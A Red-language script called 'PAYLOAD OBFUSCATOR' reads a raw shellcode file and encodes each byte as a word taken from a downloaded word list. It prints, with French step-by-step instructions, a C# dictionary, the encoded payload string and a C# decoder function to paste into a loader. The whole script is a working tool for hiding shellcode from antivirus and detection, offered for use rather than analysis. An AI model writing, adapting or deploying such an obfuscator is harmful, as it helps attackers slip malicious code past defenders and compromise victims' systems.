Red []

print {
##########################################
########### PAYLOAD OBFUSCATOR ###########
##########################################
}

if empty? mold system/options/args [
  print "The first arguments has to be a path to a raw shell code file"
  halt
]

trimed_path: trim/with mold system/options/args/1 "^""
binary_shell_code: read/binary to file! trimed_path

to-0x: function [
  {Format a integer! to a string that looks like a hex. example : to-hex 30 2 => 0x1E}
  int [integer!] "The integer to format."
  length [integer!] "The length of the formated string"
] [
  prefix: copy "0x"
  append prefix to-hex/size int length
  return lowercase prefix
]

wordlist: random split read https://www.mit.edu/~ecprice/wordlist.10000 "^/"
hex-values: []
repeat i 256 [
  append hex-values to-0x i - 1 2
]
word-dict: []
repeat i length? hex-values [
  append word-dict pick hex-values i
  append word-dict pick wordlist i
]
word-dict: make map! word-dict

c_dict: ""
foreach [i el] word-dict [
  key-value: rejoin ["{ ^"" i "^", " el " }"]
  c_dict: rejoin [c_dict ", " key-value]
]
c_dict: at c_dict 3

formated_dict: rejoin [ "var wordDict = new Dictionary<string, byte>{^/" c_dict "^/};" ]
print rejoin ["1. Copier-coller ce dictionnaire d'association dans le code C# : ^/^/" formated_dict "^/^/"]

encoded_string: "String data = ^""


foreach [i el] binary_shell_code [
  hex-value: to string! rejoin ["0x" to-hex/size el 2]
  if find hex-values hex-value [
    append encoded_string select word-dict hex-value
    append encoded_string " "
  ]
]

print rejoin ["2. Utiliser ce payload obfusque dans votre code C# : ^/^/" encoded_string "^";"]

csharp_func: {
static byte[] DecodeWordsToBytes(string data, Dictionary<string, byte> wordDict)^{
    var words = data.Split(new[] ^{ ' ' ^}, StringSplitOptions.RemoveEmptyEntries);
    var byteList = new List<byte>();
    foreach (var word in words)^{
        if (wordDict.ContainsKey(word))^{
            byteList.Add(wordDict[word]);
        ^}else^{
            Console.WriteLine("[!] Error while decoding");
        ^}
    ^}
    return byteList.ToArray();
^}}

print rejoin [ "3. Copier-coller cette fonction de decodage dans le code C# : ^/^/" csharp_func ]

